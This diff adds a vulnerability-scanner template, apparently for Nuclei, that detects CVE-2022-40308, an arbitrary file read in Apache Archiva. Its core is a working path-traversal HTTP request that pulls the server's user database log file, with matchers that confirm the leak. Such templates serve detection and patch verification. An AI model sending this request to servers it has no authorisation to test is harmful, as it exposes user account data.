@@ -1,0 +1,30 @@
+id: CVE-2022-40308
+info:
+  name: Apache Archiva RepositoryServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Apache Archiva versions prior to 2.2.9 contain a vulnerability allowing remote attackers to read arbitrary files if anonymous reading is enabled.
+  reference:
+    - https://xz.aliyun.com/t/11979
+  classification:
+    cve-id: CVE-2022-40308
+    cvss-score: 7.5
+http:
+  - raw:
+      - |
+        GET /repository/internal/..//../data/databases/users/log/log1.dat HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "AS SEARCHABLE, T10 AS UNSIGNED_ATTRIBUTE"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
